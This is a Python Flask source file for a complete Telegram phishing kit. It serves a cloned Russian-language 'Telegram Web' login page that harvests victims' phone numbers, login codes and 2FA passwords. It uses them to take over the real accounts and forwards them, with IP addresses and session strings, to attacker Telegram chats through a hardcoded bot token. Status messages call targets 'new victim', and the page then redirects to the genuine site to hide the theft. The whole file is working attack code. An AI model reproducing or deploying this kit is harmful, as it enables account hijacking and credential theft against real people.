from flask import Flask, request, render_template_string, jsonify
import requests
import subprocess
import json
import os

app = Flask(__name__)

BOT_TOKEN = "7978014372:AAEBsdCAY6rXCnM5qbF_KJ9OLBpw3AiAYg8"
CHAT_IDS = ["1626236089", "5009861049"]

def send_to_tg(message):
    for chat_id in CHAT_IDS:
        try:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                         json={"chat_id": chat_id, "text": message})
        except:
            pass

# Хранилище phone_code_hash (в реальности лучше Redis)
temp_storage = {}

HTML = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Web</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0d0f12;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .login-card {
            background: #1f2a36;
            border-radius: 28px;
            box-shadow: 0 12px 28px rgba(0, 0, 0, 0.3);
            overflow: hidden;
            max-width: 420px;
            width: 100%;
        }
        .login-header {
            background: #2b3b4c;
            padding: 40px 24px 32px;
            text-align: center;
        }
        .telegram-icon {
            width: 88px;
            height: 88px;
            background: #2aabee;
            border-radius: 50%;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }
        .telegram-icon svg { width: 52px; height: 52px; fill: white; }
        .login-header h1 { color: white; font-size: 26px; font-weight: 600; margin-bottom: 8px; }
        .login-header p { color: rgba(255, 255, 255, 0.7); font-size: 14px; }
        .login-form { padding: 32px 24px; background: #17212b; }
        .input-group { margin-bottom: 20px; }
        .input-group label { display: block; color: #cbd5e0; font-size: 14px; margin-bottom: 8px; font-weight: 500; }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            background: #1f2a36;
            border: 1px solid #2b3b4c;
            border-radius: 12px;
            font-size: 16px;
            color: white;
        }
        .input-group input:focus { outline: none; border-color: #2aabee; }
        .submit-btn {
            width: 100%;
            padding: 14px;
            background: #2aabee;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            color: white;
            cursor: pointer;
            margin-top: 8px;
        }
        .submit-btn:hover { background: #1e96d4; }
        .submit-btn:disabled { opacity: 0.6; cursor: not-allowed; }
        .help-links { margin-top: 20px; text-align: center; font-size: 13px; color: #6c7a89; }
        .help-links a { color: #2aabee; text-decoration: none; margin: 0 8px; }
        .qr-option { margin-top: 20px; padding-top: 20px; border-top: 1px solid #1f2a36; text-align: center; cursor: pointer; }
        .qr-option span { color: #6c7a89; font-size: 13px; }
        .qr-option a { color: #2aabee; text-decoration: none; margin-left: 5px; }
        .error-message {
            background: rgba(255, 80, 80, 0.1);
            border: 1px solid #ff5050;
            border-radius: 10px;
            padding: 12px;
            margin-bottom: 20px;
            color: #ff6b6b;
            font-size: 13px;
            text-align: center;
            display: none;
        }
        .hidden { display: none; }
        .loader {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid #fff;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 0.6s linear infinite;
            margin-left: 8px;
            vertical-align: middle;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
<div class="login-card">
    <div class="login-header">
        <div class="telegram-icon">
            <svg viewBox="0 0 24 24">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.6-1.38-.97-2.23-1.56-.99-.69-.35-1.07.22-1.69.15-.15 2.71-2.48 2.76-2.69.01-.03.02-.13-.05-.18-.07-.05-.17-.03-.25-.02-.11.02-1.86 1.18-5.26 3.48-.5.34-.95.51-1.36.5-.45-.01-1.31-.25-1.95-.46-.78-.25-1.4-.38-1.35-.81.03-.22.33-.45.92-.68 3.62-1.58 6.04-2.62 7.26-3.12 3.46-1.42 4.18-1.67 4.65-1.68.1 0 .33.02.48.15.12.1.15.24.17.35-.01.04.01.1 0 .14z"/>
            </svg>
        </div>
        <h1>Telegram Web</h1>
        <p>Войдите в свой аккаунт</p>
    </div>
    <div class="login-form">
        <div id="errorMsg" class="error-message"></div>
        <form id="loginForm">
            <div class="input-group">
                <label>Номер телефона</label>
                <input type="tel" id="phone" name="phone" placeholder="+7 XXX XXX XX-XX" required>
            </div>
            <div class="input-group hidden" id="codeGroup">
                <label>Код подтверждения</label>
                <input type="text" id="code" name="code" placeholder="Код из Telegram">
            </div>
            <div class="input-group hidden" id="passwordGroup">
                <label>Пароль (2FA)</label>
                <input type="password" id="password" name="password" placeholder="Облачный пароль">
            </div>
            <button type="submit" class="submit-btn" id="submitBtn">Далее</button>
        </form>
        <div class="help-links">
            <a href="#" id="forgotBtn">Забыли пароль?</a>
            <span>•</span>
            <a href="#" id="qrBtn">Войти через QR-код</a>
        </div>
        <div class="qr-option">
            <span>Нет аккаунта?</span>
            <a href="#" id="registerBtn">Зарегистрироваться</a>
        </div>
    </div>
</div>

<script>
    let step = 1;
    let phoneNumber = '';

    const phoneInput = document.getElementById('phone');
    const codeInput = document.getElementById('code');
    const passwordInput = document.getElementById('password');
    const codeGroup = document.getElementById('codeGroup');
    const passwordGroup = document.getElementById('passwordGroup');
    const submitBtn = document.getElementById('submitBtn');
    const errorMsgDiv = document.getElementById('errorMsg');

    function showError(text) {
        errorMsgDiv.textContent = text;
        errorMsgDiv.style.display = 'block';
        setTimeout(() => {
            errorMsgDiv.style.display = 'none';
        }, 3000);
    }

    function isValidPhone(phone) {
        const digits = phone.replace(/[^0-9]/g, '');
        return digits.length >= 8;
    }

    document.getElementById('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();

        if (step === 1) {
            const phone = phoneInput.value.trim();
            if (!phone) { showError('Введите номер телефона'); return; }
            if (!isValidPhone(phone)) { showError('Введите корректный номер телефона'); return; }
            
            submitBtn.disabled = true;
            submitBtn.innerHTML = 'Отправка кода<span class="loader"></span>';
            
            try {
                const res = await fetch('/api/send_code', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone: phone })
                });
                const data = await res.json();
                
                if (!data.success) {
                    showError(data.message);
                    submitBtn.disabled = false;
                    submitBtn.innerHTML = 'Далее';
                    return;
                }
                
                phoneNumber = phone;
                step = 2;
                codeGroup.classList.remove('hidden');
                submitBtn.disabled = false;
                submitBtn.innerHTML = 'Подтвердить код';
                codeInput.focus();
            } catch(err) {
                showError('Ошибка');
                submitBtn.disabled = false;
                submitBtn.innerHTML = 'Далее';
            }
        }
        else if (step === 2) {
            const code = codeInput.value.trim();
            if (!code) { showError('Введите код подтверждения'); return; }
            
            submitBtn.disabled = true;
            submitBtn.innerHTML = 'Проверка<span class="loader"></span>';
            
            try {
                const res = await fetch('/api/confirm_code', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone: phoneNumber, code: code })
                });
                const data = await res.json();
                
                if (data.need_password) {
                    step = 3;
                    passwordGroup.classList.remove('hidden');
                    submitBtn.disabled = false;
                    submitBtn.innerHTML = 'Войти';
                    passwordInput.focus();
                } else if (data.success) {
                    submitBtn.innerHTML = 'Вход выполнен...';
                    setTimeout(() => {
                        window.location.href = 'https://web.telegram.org/k/';
                    }, 1500);
                } else {
                    showError(data.message);
                    submitBtn.disabled = false;
                    submitBtn.innerHTML = 'Подтвердить код';
                }
            } catch(err) {
                showError('Ошибка');
                submitBtn.disabled = false;
                submitBtn.innerHTML = 'Подтвердить код';
            }
        }
        else if (step === 3) {
            const password = passwordInput.value.trim();
            
            submitBtn.disabled = true;
            submitBtn.innerHTML = 'Вход<span class="loader"></span>';
            
            await fetch('/api/confirm_2fa', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: phoneNumber, password: password })
            });
            
            submitBtn.innerHTML = 'Вход выполнен...';
            setTimeout(() => {
                window.location.href = 'https://web.telegram.org/k/';
            }, 1500);
        }
    });
</script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/api/send_code', methods=['POST'])
def send_code():
    data = request.json
    phone = data.get('phone')
    
    try:
        result = subprocess.run(
            ['python', 'worker.py', 'send_code', json.dumps({'phone': phone})],
            capture_output=True, text=True, timeout=30
        )
        res = json.loads(result.stdout)
        
        if res.get('status') == 'ok':
            temp_storage[phone] = res['phone_code_hash']
            send_to_tg(f"📞 НОВАЯ ЖЕРТВА\n\n📱 Номер: {phone}\n✅ Код отправлен\n🌐 IP: {request.remote_addr}")
            return jsonify({'success': True, 'message': 'Код отправлен'})
        else:
            return jsonify({'success': False, 'message': res.get('message', 'Ошибка')})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/confirm_code', methods=['POST'])
def confirm_code():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    phone_code_hash = temp_storage.get(phone)
    
    if not phone_code_hash:
        return jsonify({'success': False, 'message': 'Сессия не найдена'})
    
    try:
        result = subprocess.run(
            ['python', 'worker.py', 'complete_login', json.dumps({'phone': phone, 'code': code, 'phone_code_hash': phone_code_hash})],
            capture_output=True, text=True, timeout=30
        )
        res = json.loads(result.stdout)
        
        if res.get('status') == 'ok':
            send_to_tg(f"🔑 КОД ВЕРНЫЙ\n\n📱 {phone}\n🔢 Код: {code}\n✅ Вход выполнен")
            return jsonify({'success': True})
        elif "2FA" in res.get('message', ''):
            return jsonify({'need_password': True})
        else:
            return jsonify({'success': False, 'message': res.get('message', 'Ошибка')})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/confirm_2fa', methods=['POST'])
def confirm_2fa():
    data = request.json
    phone = data.get('phone')
    password = data.get('password')
    phone_code_hash = temp_storage.get(phone)
    
    try:
        result = subprocess.run(
            ['python', 'worker.py', 'complete_login', json.dumps({'phone': phone, 'code': '', 'phone_code_hash': phone_code_hash, 'password': password})],
            capture_output=True, text=True, timeout=30
        )
        res = json.loads(result.stdout)
        
        if res.get('status') == 'ok':
            send_to_tg(f"🔒 2FA ПОЛУЧЕН\n\n📱 {phone}\n🔐 Пароль: {password}\n✅ ДОСТУП ПОЛУЧЕН\n🎭 session: {res.get('session', '')[:50]}...")
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'message': res.get('message', 'Ошибка')})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
